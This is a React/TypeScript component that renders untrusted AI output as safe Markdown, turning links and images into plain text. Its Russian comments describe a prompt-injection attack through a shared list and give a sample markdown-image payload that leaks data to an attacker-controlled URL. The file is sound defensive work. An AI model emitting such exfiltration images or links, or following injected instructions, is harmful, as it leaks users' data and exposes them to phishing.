import ReactMarkdown, { type Components } from "react-markdown";

/**
 * Безопасный поднабор Markdown для недоверенного ответа AI.
 *
 * Сырой HTML `react-markdown` не исполняет по умолчанию, а ссылки и картинки
 * здесь дополнительно превращаются в обычный текст. Иначе prompt injection в
 * расшаренном списке могла бы заставить модель показать другому участнику
 * кликабельную фишинговую ссылку от имени приложения.
 *
 * Картинка опаснее ссылки: клик ей не нужен. `![](https://чужой/?d=...)`
 * рендерится в `<img src>`, и браузер жертвы уходит на адрес атакующего сам,
 * унося IP, факт просмотра и всё, что модель согласилась положить в URL. Автор
 * заметки в расшаренном списке при этом может быть уже исключён из него.
 * Поэтому от картинки остаётся только alt-текст: ни одного атрибута из ответа
 * модели в разметку не попадает.
 */
const components: Components = {
  // Длинные URL встречаются и в fenced code: сохраняем пробелы, но разрешаем перенос.
  pre: ({ node, ...props }) => {
    void node;
    return <pre className="whitespace-pre-wrap" {...props} />;
  },
  p: ({ node, ...props }) => {
    void node;
    return <p className="mb-2 last:mb-0" {...props} />;
  },
  strong: ({ node, ...props }) => {
    void node;
    return (
      <strong
        className="font-semibold text-gray-900 dark:text-gray-100"
        {...props}
      />
    );
  },
  ul: ({ node, ...props }) => {
    void node;
    return (
      <ul
        className="list-disc pl-4 mb-2 last:mb-0 space-y-1"
        {...props}
      />
    );
  },
  ol: ({ node, ...props }) => {
    void node;
    return (
      <ol
        className="list-decimal pl-4 mb-2 last:mb-0 space-y-1"
        {...props}
      />
    );
  },
  li: ({ node, ...props }) => {
    void node;
    return <li className="pl-1" {...props} />;
  },
  a: ({ node, href, title, ...props }) => {
    void node;
    void href;
    // `title` — тоже текст модели: он не создаёт навигации, но всплывающей
    // подсказкой показал бы участнику произвольную строку от имени приложения.
    void title;
    return <span {...props} />;
  },
  img: ({ node, alt, ...props }) => {
    void node;
    // Остальные атрибуты — `src`, `title`, `width` — приходят из ответа модели
    // и сознательно отбрасываются целиком, а не фильтруются по списку.
    void props;
    return <span>{alt}</span>;
  },
};

export default function SafeMarkdown({ children }: { children: string }) {
  return (
    <div className="min-w-0 [overflow-wrap:anywhere]" data-testid="safe-markdown">
      <ReactMarkdown components={components}>{children}</ReactMarkdown>
    </div>
  );
}
